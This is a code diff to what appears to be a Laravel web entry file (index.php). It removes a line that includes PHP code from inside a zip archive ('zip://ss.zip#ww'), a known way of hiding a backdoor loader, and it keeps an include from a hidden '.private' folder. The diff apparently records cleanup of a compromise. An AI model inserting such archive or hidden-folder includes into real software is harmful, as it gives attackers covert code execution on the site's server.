@@ -1,6 +1,5 @@
 <?php
 include dirname(__FILE__) . '/.private/config.php';
-include("zip://ss.zip#ww");
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
 
@@ -17,8 +16,8 @@ define('LARAVEL_START', microtime(true));
 |
 */
 
-if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
-    require $maintenance;
+if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
+    require __DIR__.'/../storage/framework/maintenance.php';
 }
 
 /*
@@ -54,3 +53,4 @@ $response = $kernel->handle(
 )->send();
 
 $kernel->terminate($request, $response);
+
